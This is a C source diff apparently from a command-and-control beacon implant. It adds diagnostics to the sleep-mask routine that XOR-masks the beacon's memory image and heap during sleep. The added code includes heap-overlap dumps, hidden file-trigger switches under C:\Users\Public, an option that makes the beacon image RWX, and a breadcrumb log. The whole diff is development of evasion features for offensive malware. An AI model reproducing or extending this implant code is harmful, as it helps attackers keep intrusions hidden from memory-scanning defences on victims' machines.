@@ -343,7 +343,15 @@ static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t,
 	if (gp->heap_records == NULL)
 		n += wsprintfA(buf + n, "heap=NULL FAULT_[rcx+10]\r\n");
 	else {
-		for (i = 0; i < 24 && n < 3800; i++) {
+		int total = 0;
+		char * harr;
+		char * hend;
+		while (gp->heap_records[total].ptr != NULL)
+			total++;
+		harr = (char *)gp->heap_records;
+		hend = harr + (total + 1) * (int)sizeof(HEAP_RECORD);
+		n += wsprintfA(buf + n, "heapN=%d\r\n", total);
+		for (i = 0; i < 64 && n < 3900; i++) {
 			char * p = gp->heap_records[i].ptr;
 			unsigned z = (unsigned)gp->heap_records[i].size;
 			n += wsprintfA(buf + n, "heap[%d] ptr=%p size=%u", i, p, z);
@@ -353,6 +361,12 @@ static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t,
 			}
 			if (bof != NULL && p >= bof && p < bof + blen)
 				n += wsprintfA(buf + n, " IN_BOF");
+			if (p < (char *)gp + sizeof(GARGLEP) && p + z > (char *)gp)
+				n += wsprintfA(buf + n, " COVERS_GPARMS");
+			if (p < hend && p + z > harr)
+				n += wsprintfA(buf + n, " COVERS_HEAP_ARRAY");
+			if (p < (char *)gp->sections + 64 && p + z > (char *)gp->sections)
+				n += wsprintfA(buf + n, " COVERS_SECTIONS");
 			n += wsprintfA(buf + n, "\r\n");
 		}
 	}
@@ -699,10 +713,11 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 #if defined(_M_X64)
 				/* Diagnostic switches, re-checked on every sleep:
 				   C:\Users\Public\sm_empty -> invoke with an empty sections table
-				   and a terminator-only heap table (isolates XOR content from
-				   prologue / call rbp / return path).
-				   C:\Users\Public\sm_wrwx  -> VirtualProtect the beacon image to
-				   RWX before invoke (left RWX; tests the RX-write hypothesis). */
+				   and a terminator-only heap table.
+				   C:\Users\Public\sm_sect  -> real sections, empty heap (XOR image only).
+				   C:\Users\Public\sm_heap  -> empty sections, real heap (XOR heap only).
+				   C:\Users\Public\sm_wrwx  -> VirtualProtect the beacon image to RWX
+				   before invoke (left RWX; tests the RX-write hypothesis). */
 				{
 					static HEAP_RECORD sm_empty_heap[1] = { { NULL, 0 } };
 					DWORD sm_mode = 0;
@@ -711,12 +726,22 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 						sm_mode |= 1;
 					if (GetFileAttributesA("C:\\Users\\Public\\sm_wrwx") != INVALID_FILE_ATTRIBUTES)
 						sm_mode |= 2;
+					if (GetFileAttributesA("C:\\Users\\Public\\sm_sect") != INVALID_FILE_ATTRIBUTES)
+						sm_mode |= 8;
+					if (GetFileAttributesA("C:\\Users\\Public\\sm_heap") != INVALID_FILE_ATTRIBUTES)
+						sm_mode |= 16;
 					sm_span = sm_max_end(gparms);
 					sm_dump_gparms(gparms, code_dst, total, t, sm_mode, sm_span,
 						(void *)inlinefunc);
-					if ((sm_mode & 1) != 0 && gparms != NULL) {
-						gparms->sections = empty_sections;
-						gparms->heap_records = sm_empty_heap;
+					if (gparms != NULL) {
+						if ((sm_mode & 1) != 0) {
+							gparms->sections = empty_sections;
+							gparms->heap_records = sm_empty_heap;
+						}
+						else if ((sm_mode & 8) != 0)
+							gparms->heap_records = sm_empty_heap;
+						else if ((sm_mode & 16) != 0)
+							gparms->sections = empty_sections;
 					}
 					if ((sm_mode & 2) != 0 && gparms != NULL && sm_span != 0) {
 						DWORD sm_old;
@@ -730,6 +755,22 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					Sleep(t);
 				else
 					((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
+#if defined(_M_X64)
+				/* breadcrumb: proves the BOF returned (crash inside invoke
+				 * never reaches this write) */
+				if (gparms != NULL) {
+					HANDLE ph = CreateFileA("C:\\Users\\Public\\sm_post.txt",
+						FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS,
+						FILE_ATTRIBUTE_NORMAL, NULL);
+					if (ph != INVALID_HANDLE_VALUE) {
+						char lb[64];
+						DWORD wr2;
+						int ln = wsprintfA(lb, "returned t=%u\r\n", t);
+						WriteFile(ph, lb, (DWORD)ln, &wr2, NULL);
+						CloseHandle(ph);
+					}
+				}
+#endif
 				beacon_sleep_mask_set_exec(NULL, 0, 0);
 			}
 			else {
